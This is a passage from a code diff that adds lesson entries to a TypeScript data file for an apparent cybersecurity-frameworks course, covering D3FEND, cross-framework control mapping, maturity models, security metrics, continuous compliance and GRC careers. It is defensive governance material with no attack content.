rules for malicious attachments |\n| Homoglyph Detection | Detect | Identify lookalike domain names |\n| Outbound Traffic Filtering | Harden | Block known C2 domains |\n| User Training | Harden | Phishing awareness program |\n| Email Quarantine | Isolate | Suspicious email isolation |\n\n## Using D3FEND for Framework Compliance\n\nD3FEND enriches framework controls with specific defensive techniques:\n\n1. **Map your framework controls** (e.g., ISO 27001 A.8.23 Web Filtering)\n2. **Identify the ATT&CK techniques** the control addresses\n3. **Find D3FEND countermeasures** that implement the control\n4. **Evaluate coverage** — are you using the most effective defensive techniques?\n\n## D3FEND Knowledge Graph\n\nThe knowledge graph connects:\n- **Digital artifacts** (files, processes, network traffic)\n- **Defensive techniques** (what defenders do)\n- **Offensive techniques** (what attackers do)\n- **Technologies** (tools that implement defenses)\n\nThis creates a complete picture: "When an attacker does X to artifact Y, we can defend with technique Z using technology W."`, keyTakeaways: ["D3FEND catalogs defensive techniques organized into Harden, Detect, Isolate, Deceive, and Evict", "It provides the defensive counterpart to ATT&CK's offensive technique catalog", "D3FEND enriches framework controls with specific, actionable defensive techniques", "The knowledge graph connects artifacts, offensive techniques, defensive techniques, and technologies", "Use D3FEND to evaluate whether your controls use the most effective defensive approaches"] },
+  { id: "cf-9.3", courseId: "cybersecurity-frameworks", title: "Framework Cross-Mapping & Integration", content: `# Framework Cross-Mapping & Integration\n\nMost organizations need to comply with multiple frameworks simultaneously. Cross-mapping identifies overlapping requirements to reduce duplication and create a unified control framework.\n\n## Why Cross-Map?\n\n- **Reduce audit fatigue** — One control can satisfy multiple frameworks\n- **Eliminate redundancy** — Avoid implementing the same control differently\n- **Unified reporting** — Single dashboard for multi-framework compliance\n- **Cost efficiency** — Maximize ROI on control implementation\n\n## Major Framework Mappings\n\n### NIST CSF ↔ ISO 27001 ↔ CIS Controls\n\n| NIST CSF | ISO 27001:2022 | CIS Control v8 |\n|----------|---------------|----------------|\n| ID.AM (Asset Management) | A.5.9, A.5.10 | CIS 1, 2 |\n| PR.AA (Access Control) | A.5.15, A.8.5 | CIS 5, 6 |\n| PR.DS (Data Security) | A.8.10, A.8.11, A.8.12 | CIS 3 |\n| PR.PS (Platform Security) | A.8.9 | CIS 4 |\n| DE.CM (Continuous Monitoring) | A.8.16 | CIS 8, 13 |\n| RS.MA (Incident Management) | A.5.24, A.5.25, A.5.26 | CIS 17 |\n\n### Adding PCI-DSS to the Map\n\n| Unified Control | NIST CSF | ISO 27001 | CIS | PCI-DSS |\n|----------------|----------|-----------|-----|--------|\n| Asset Inventory | ID.AM-1 | A.5.9 | 1.1 | 2.4 |\n| Access Control | PR.AA-1 | A.5.15 | 6.1 | 7.1 |\n| Encryption | PR.DS-1 | A.8.24 | 3.6 | 3.4, 4.1 |\n| Logging | DE.CM-1 | A.8.16 | 8.2 | 10.1 |\n| Vulnerability Mgmt | ID.RA-1 | A.8.8 | 7.1 | 6.1, 11.2 |\n| Incident Response | RS.MA-1 | A.5.24 | 17.1 | 12.10 |\n\n## Building a Unified Control Framework\n\n### Step 1: Choose a Primary Framework\nSelect one framework as your foundation (usually NIST CSF or ISO 27001).\n\n### Step 2: Map Secondary Frameworks\nMap all other framework requirements to your primary framework's controls.\n\n### Step 3: Identify Unique Requirements\nSome frameworks have unique requirements not covered by others:\n- PCI-DSS: Specific cardholder data encryption requirements\n- HIPAA: Business Associate Agreements\n- GDPR: Data subject access requests, DPIAs\n\n### Step 4: Create Unified Control Catalog\n\n\`\`\`\nControl ID: UC-001\nControl Name: Enterprise Asset Inventory\nDescription: Maintain a complete inventory of all enterprise assets\nFramework Mappings:\n  - NIST CSF: ID.AM-1\n  - ISO 27001: A.5.9\n  - CIS Controls: 1.1\n  - PCI-DSS: 2.4\n  - SOC 2: CC6.1\nOwner: IT Asset Manager\nEvidence: CMDB export, network scan results\nReview Frequency: Quarterly\n\`\`\`\n\n## GRC Tools for Cross-Mapping\n\n- **Drata/Vanta** — Automated compliance mapping\n- **OneTrust** — Multi-framework management\n- **ServiceNow GRC** — Enterprise governance platform\n- **LogicGate** — Flexible risk and compliance workflows`, keyTakeaways: ["Cross-mapping identifies overlapping controls across frameworks to eliminate redundancy", "One well-implemented control can satisfy requirements from 4-5 different frameworks", "Choose a primary framework (NIST CSF or ISO 27001) and map others to it", "Identify unique requirements that don't overlap (BAAs for HIPAA, DPIAs for GDPR)", "GRC tools automate cross-mapping and centralize multi-framework compliance management"] },
+  { id: "cf-9.4", courseId: "cybersecurity-frameworks", title: "Hands-On: Building a Control Mapping Matrix", content: `# Hands-On: Building a Control Mapping Matrix\n\nIn this exercise, you'll create a practical cross-framework control mapping matrix that can be used in real-world security programs.\n\n## Exercise Scenario\n\nYou are the security analyst for CloudFirst Inc., a SaaS company that:\n- Processes customer financial data (PCI-DSS applies)\n- Has EU customers (GDPR applies)\n- Needs SOC 2 Type II for enterprise sales\n- Uses NIST CSF as their primary framework\n\n## Step 1: Create the Matrix Template\n\n\`\`\`\n| Control ID | Control Name | NIST CSF | ISO 27001 | CIS v8 | PCI-DSS | SOC 2 | GDPR | Owner | Status |\n|-----------|-------------|----------|-----------|--------|---------|-------|------|-------|--------|\n\`\`\`\n\n## Step 2: Populate Core Controls\n\n| ID | Control | NIST CSF | ISO 27001 | CIS | PCI-DSS | SOC 2 | GDPR |\n|----|---------|----------|-----------|-----|---------|-------|------|\n| UC-001 | Asset Inventory | ID.AM-1 | A.5.9 | 1.1 | 2.4 | CC6.1 | Art.30 |\n| UC-002 | MFA Enforcement | PR.AA-3 | A.8.5 | 6.5 | 8.4 | CC6.1 | Art.32 |\n| UC-003 | Data Encryption at Rest | PR.DS-1 | A.8.24 | 3.6 | 3.4 | CC6.1 | Art.32 |\n| UC-004 | Data Encryption in Transit | PR.DS-2 | A.8.24 | 3.9 | 4.1 | CC6.1 | Art.32 |\n| UC-005 | Vulnerability Scanning | ID.RA-1 | A.8.8 | 7.1 | 11.2 | CC7.1 | Art.32 |\n| UC-006 | Security Awareness Training | PR.AT-1 | A.6.3 | 14.1 | 12.6 | CC1.4 | Art.39 |\n| UC-007 | Incident Response Plan | RS.MA-1 | A.5.24 | 17.1 | 12.10 | CC7.3 | Art.33 |\n| UC-008 | Access Reviews | PR.AA-5 | A.5.18 | 5.1 | 7.2 | CC6.2 | Art.32 |\n| UC-009 | Backup & Recovery | RC.RP-1 | A.8.13 | 11.1 | 9.5.1 | A1.2 | Art.32 |\n| UC-010 | Change Management | PR.PS-1 | A.8.32 | 4.1 | 6.5.6 | CC8.1 | — |\n\n## Step 3: Identify Unique Requirements\n\nSome requirements are framework-specific:\n\n| Framework | Unique Requirement | Control Needed |\n|-----------|-------------------|---------------|\n| PCI-DSS | No CVV storage | Data purging policy |\n| GDPR | DPIA process | Privacy impact assessment |\n| GDPR | Data subject access requests | DSAR workflow |\n| GDPR | DPO appointment | Role designation |\n| SOC 2 | Annual pen test | Third-party assessment |\n| PCI-DSS | Quarterly ASV scan | External scanning |\n\n## Step 4: Add Evidence Requirements\n\nFor each unified control, document:\n- What evidence demonstrates compliance\n- Where evidence is stored\n- How often evidence is collected\n- Who is responsible for collection\n\n## Deliverables\n\nAfter this exercise, you should have:\n1. ✅ A unified control matrix mapping 6 frameworks\n2. ✅ Framework-specific requirements identified\n3. ✅ Evidence requirements for each control\n4. ✅ A template ready for real-world use`, keyTakeaways: ["A unified control matrix consolidates 6+ frameworks into a single manageable document", "Core controls like MFA, encryption, and incident response satisfy nearly every framework", "Each framework has unique requirements (CVV storage for PCI, DPIAs for GDPR) that need dedicated controls", "Evidence requirements must be documented for every control to support audits", "This matrix becomes the foundation of your GRC program and audit preparation"] },
+
+  // Module 10: Building & Maturing
+  { id: "cf-10.1", courseId: "cybersecurity-frameworks", title: "Security Program Maturity Models", content: `# Security Program Maturity Models\n\nMaturity models provide a structured way to measure and improve an organization's cybersecurity capabilities over time. They help answer: "How good are we?" and "What should we improve next?"\n\n## Common Maturity Models\n\n### Capability Maturity Model Integration (CMMI)\n\n| Level | Name | Description |\n|-------|------|-------------|\n| 1 | Initial | Ad hoc, reactive, chaotic |\n| 2 | Managed | Documented processes for specific projects |\n| 3 | Defined | Organization-wide standardized processes |\n| 4 | Quantitatively Managed | Measured and controlled with metrics |\n| 5 | Optimizing | Continuous improvement driven by data |\n\n### Cybersecurity Capability Maturity Model (C2M2)\nDesigned for critical infrastructure:\n- 10 domains (Risk Management, Asset Management, Threat Detection, etc.)\n- 4 maturity indicator levels (MIL0-MIL3)\n- Self-assessment tool available from DOE\n\n### NIST CSF Tiers (Simplified Maturity)\n- Tier 1: Partial\n- Tier 2: Risk Informed\n- Tier 3: Repeatable\n- Tier 4: Adaptive\n\n## Building Your Own Maturity Assessment\n\n### Step 1: Define Domains\nSelect 8-12 security domains to assess:\n1. Governance & Strategy\n2. Risk Management\n3. Asset Management\n4. Identity & Access Management\n5. Data Protection\n6. Security Operations (Monitoring & Detection)\n7. Incident Response\n8. Vulnerability Management\n9. Third-Party Risk\n10. Security Awareness\n\n### Step 2: Define Maturity Levels\n\n| Level | Characteristics | Evidence |\n|-------|----------------|----------|\n| 1 - Ad Hoc | No formal process, reactive | Tribal knowledge only |\n| 2 - Developing | Some documentation, inconsistent | Draft policies, partial coverage |\n| 3 - Defined | Documented, standardized, consistent | Approved policies, procedures |\n| 4 - Managed | Measured, tracked, reported | Metrics, dashboards, KPIs |\n| 5 - Optimized | Automated, predictive, continuously improving | ML-driven, real-time adjustment |\n\n### Step 3: Assess and Score\n\nFor each domain, rate current maturity and set a target:\n\n\`\`\`\nDomain                     Current  Target  Gap\n─────────────────────────  ───────  ──────  ───\nGovernance & Strategy         2       3      1\nRisk Management               1       3      2\nAsset Management              2       3      1\nIdentity & Access             3       4      1\nData Protection               2       3      1\nSecurity Operations           1       3      2\nIncident Response             2       3      1\nVulnerability Management      2       4      2\nThird-Party Risk              1       2      1\nSecurity Awareness            3       3      0\n─────────────────────────  ───────  ──────  ───\nAverage                      1.9     3.1    1.2\n\`\`\`\n\n### Step 4: Create Improvement Roadmap\n\nPrioritize domains with the largest gaps and highest business impact.`, keyTakeaways: ["Maturity models measure cybersecurity capabilities from ad hoc (Level 1) to optimized (Level 5)", "CMMI, C2M2, and NIST CSF Tiers are the most widely used maturity frameworks", "Custom maturity assessments typically cover 8-12 security domains", "Gap between current and target maturity drives the improvement roadmap", "Not every domain needs to reach Level 5 — target maturity should align with risk appetite"] },
+  { id: "cf-10.2", courseId: "cybersecurity-frameworks", title: "Metrics, KPIs & Reporting to Leadership", content: `# Metrics, KPIs & Reporting to Leadership\n\nSecurity metrics translate technical activity into business-relevant information. Good metrics drive better decisions; bad metrics create false confidence.\n\n## Types of Security Metrics\n\n### Key Performance Indicators (KPIs)\nMeasure how well the security program is performing:\n- Percentage of systems with current patches\n- Percentage of employees completing security training\n- Mean time to detect (MTTD)\n- Mean time to respond (MTTR)\n\n### Key Risk Indicators (KRIs)\nSignal changes in the risk landscape:\n- Number of critical vulnerabilities unpatched >30 days\n- Number of privileged accounts without MFA\n- Third-party vendors without current assessments\n- Phishing simulation click rate trend\n\n### Operational Metrics\nTrack daily security operations:\n- Alerts triaged per analyst per day\n- False positive rate\n- Incident volume by category\n- Vulnerability scan coverage\n\n## Effective Security Dashboard\n\n### Executive Dashboard (Board/C-Suite)\nFocuses on risk and business impact:\n\`\`\`\n┌─────────────────────────────────────────────────┐\n│  Overall Risk Score: 72/100 (Moderate) ▲ +5     │\n├─────────────────┬───────────────────────────────┤\n│ Framework       │ NIST CSF Maturity: 2.8/4.0   │\n│ Compliance      │ PCI-DSS: 94% compliant        │\n│                 │ SOC 2: Annual audit passed     │\n├─────────────────┼───────────────────────────────┤\n│ Key Risks       │ 3 Critical │ 12 High │ 28 Med │\n├─────────────────┼───────────────────────────────┤\n│ Incidents       │ 2 this quarter (both resolved) │\n│ MTTD: 2.3 hrs  │ MTTR: 4.1 hrs (target: <6hr) │\n├─────────────────┼───────────────────────────────┤\n│ Investments     │ 3 projects on track, 1 delayed│\n└─────────────────┴───────────────────────────────┘\n\`\`\`\n\n### Operational Dashboard (Security Team)\n- Real-time alert queue status\n- Analyst workload distribution\n- SIEM performance and health\n- Active investigations\n- Threat intelligence feed status\n\n## Reporting Best Practices\n\n1. **Lead with risk, not technology** — "We have 3 unpatched critical systems" not "We need to deploy KB5034441"\n2. **Use trends, not snapshots** — Show improvement (or degradation) over time\n3. **Compare to benchmarks** — Industry averages provide context\n4. **Include recommendations** — Every metric should drive a decision\n5. **Limit to 5-7 metrics** for executive audiences\n6. **Tell a story** — Connect metrics to business outcomes\n\n## Dangerous Metrics (Avoid)\n\n- Number of attacks blocked (vanity metric)\n- Number of vulnerabilities found (without context)\n- Compliance percentage without risk context\n- Metrics that only go up (no accountability)`, keyTakeaways: ["KPIs measure program performance; KRIs signal changes in the risk landscape", "Executive dashboards should focus on risk scores, compliance status, and incident trends", "Effective reporting leads with risk and business impact, not technical details", "Limit executive metrics to 5-7 key indicators with trend data and benchmarks", "Avoid vanity metrics like 'attacks blocked' that provide no actionable insight"] },
+  { id: "cf-10.3", courseId: "cybersecurity-frameworks", title: "Continuous Compliance & Automation", content: `# Continuous Compliance & Automation\n\nTraditional compliance is a point-in-time exercise — annual audits, manual evidence collection, and last-minute scrambles. Continuous compliance transforms this into an ongoing, automated process.\n\n## The Problem with Point-in-Time Compliance\n\n- Controls may degrade between audits\n- Evidence collection is manual and time-consuming\n- Audit preparation creates "compliance sprints"\n- Gap between compliance state and audit results\n- Teams spend weeks preparing documentation\n\n## Continuous Compliance Architecture\n\n\`\`\`\n┌──────────────────────────────────────────────────┐\n│              GRC Platform                         │\n│  (Drata, Vanta, Secureframe, OneTrust)           │\n├──────────────┬───────────────┬────────────────────┤\n│ Automated    │ Evidence      │ Policy & Control   │\n│ Monitoring   │ Collection    │ Management         │\n├──────────────┼───────────────┼────────────────────┤\n│ Integrations:                                     │\n│ Cloud (AWS, Azure, GCP) → Config compliance       │\n│ Identity (Okta, Azure AD) → Access reviews        │\n│ Endpoint (MDM) → Device compliance                │\n│ HR (BambooHR) → Background checks, training       │\n│ Dev (GitHub) → Code review, SDLC compliance       │\n│ Ticketing (Jira) → Change management evidence     │\n└──────────────────────────────────────────────────┘\n\`\`\`\n\n## Key Automation Capabilities\n\n### 1. Automated Evidence Collection\n- Pull configurations from cloud providers automatically\n- Screenshot dashboards at regular intervals\n- Collect access review completions from identity providers\n- Track training completion from LMS systems\n\n### 2. Continuous Control Monitoring\n- Real-time alerts when controls fail\n- Configuration drift detection\n- Policy compliance checks (e.g., MFA enabled, encryption on)\n- Automated remediation for common issues\n\n### 3. Automated Testing\n- Scheduled vulnerability scans\n- Configuration benchmarking (CIS-CAT)\n- Automated penetration testing tools\n- Cloud security posture management (CSPM)\n\n## GRC Platform Comparison\n\n| Platform | Best For | Key Feature | Price Range |\n|----------|---------|-------------|-------------|\n| Drata | Startups/SMB | 75+ integrations | $$$ |\n| Vanta | SaaS companies | Fast SOC 2 readiness | $$$ |\n| Secureframe | Mid-market | Multi-framework | $$$ |\n| OneTrust | Enterprise | Privacy + GRC | $$$$ |\n| ServiceNow GRC | Large enterprise | IT integration | $$$$$ |\n\n## Implementation Roadmap\n\n1. **Month 1-2:** Select GRC platform, configure integrations\n2. **Month 2-3:** Map controls, enable automated evidence collection\n3. **Month 3-4:** Set up continuous monitoring alerts\n4. **Month 4-6:** Fine-tune, reduce manual tasks to <20%\n5. **Ongoing:** Maintain integrations, add new frameworks`, keyTakeaways: ["Continuous compliance replaces annual audit scrambles with automated, ongoing monitoring", "GRC platforms integrate with cloud, identity, HR, and dev tools for automatic evidence collection", "Automation can reduce manual compliance work by 80% or more", "Key capabilities: evidence collection, control monitoring, and automated testing", "Implementation typically takes 4-6 months to achieve mature continuous compliance"] },
+  { id: "cf-10.4", courseId: "cybersecurity-frameworks", title: "Course Summary & Career Paths in GRC", content: `# Course Summary & Career Paths in GRC\n\nCongratulations on completing the Cybersecurity Frameworks course! Let's review what you've learned and explore career paths in governance, risk, and compliance.\n\n## Course Summary\n\n### Module 1: Cybersecurity Governance\n- Governance provides strategic direction and accountability\n- GRC integrates governance, risk management, and compliance\n- Security policies form the documentation hierarchy backbone\n\n### Module 2: NIST CSF\n- 6 functions: Govern, Identify, Protect, Detect, Respond, Recover\n- Profiles capture current and target states for gap analysis\n- Tiers 1-4 measure risk management maturity\n\n### Module 3: ISO 27001\n- The only certifiable cybersecurity framework\n- ISMS approach: people, processes, technology through risk management\n- 93 Annex A controls across 4 themes\n\n### Module 4: CIS Controls\n- 18 prioritized controls with Implementation Groups (IG1-IG3)\n- IG1 achieves ~80% risk reduction with essential cyber hygiene\n- CIS Benchmarks provide prescriptive hardening guides\n\n### Module 5: Risk Management\n- NIST RMF: 7-step process for system authorization\n- Qualitative and quantitative risk assessment techniques\n- Risk treatment: mitigate, transfer, avoid, accept\n\n### Module 6: PCI-DSS\n- 12 requirements for protecting cardholder data\n- Scope reduction through segmentation and tokenization\n- Compliance levels determine validation requirements\n\n### Module 7: Data Privacy\n- GDPR: 7 principles, data subject rights, 72-hour breach notification\n- HIPAA: PHI protection through administrative, physical, technical safeguards\n- Growing patchwork of US state privacy laws\n\n### Module 8: SOC 2 & Cloud Security\n- 5 Trust Service Criteria with Security always required\n- Type I (point-in-time) vs. Type II (period of time)\n- Shared responsibility model for cloud security\n\n### Module 9: MITRE ATT&CK & D3FEND\n- Map controls to ATT&CK techniques for gap analysis\n- D3FEND provides defensive countermeasure catalog\n- Cross-mapping creates unified control frameworks\n\n### Module 10: Program Maturity\n- Maturity models measure and guide improvement\n- Effective metrics drive decisions, not dashboards\n- Continuous compliance through automation\n\n## Career Paths in GRC\n\n| Role | Experience | Salary Range (US) |\n|------|-----------|-------------------|\n| GRC Analyst | 0-2 years | $60K-$85K |\n| Compliance Analyst | 1-3 years | $70K-$95K |\n| Risk Analyst | 2-4 years | $80K-$110K |\n| GRC Manager | 4-7 years | $110K-$150K |\n| Director of Compliance | 7-10 years | $140K-$180K |\n| CISO | 10+ years | $180K-$350K+ |\n\n## Recommended Certifications\n\n- **CISA** — Certified Information Systems Auditor (ISACA)\n- **CRISC** — Certified in Risk and Information Systems Control (ISACA)\n- **CISM** — Certified Information Security Manager (ISACA)\n- **CISSP** — Certified Information Systems Security Professional (ISC²)\n- **CompTIA Security+** — Foundation certification\n- **ISO 27001 Lead Auditor** — For ISO certification consulting\n- **PCIP** — Payment Card Industry Professional (PCI-SSC)\n\n## Next Steps\n\n1. Choose a framework and practice implementing it\n2. Pursue relevant certifications (start with CISA or Security+)\n3. Build a portfolio of risk assessments and policy documents\n4. Join professional communities (ISACA, (ISC)², CSA)\n5. Stay current with regulatory changes and emerging frameworks`, keyTakeaways: ["This course covered 9 major frameworks: NIST CSF, ISO 27001, CIS Controls, NIST RMF, PCI-DSS, GDPR, HIPAA, SOC 2, and MITRE ATT&CK", "GRC careers span from analyst to CISO with strong salary growth", "Key certifications: CISA, CRISC, CISM, CISSP for career advancement", "Practical skills (risk assessments, policy writing, gap analysis) are more valuable than theory alone", "The cybersecurity frameworks landscape continues to evolve — continuous learning is essential"] },
 ];
 
 export const getLessonContent = (courseId: string, lessonId: string): LessonContent | undefined => {
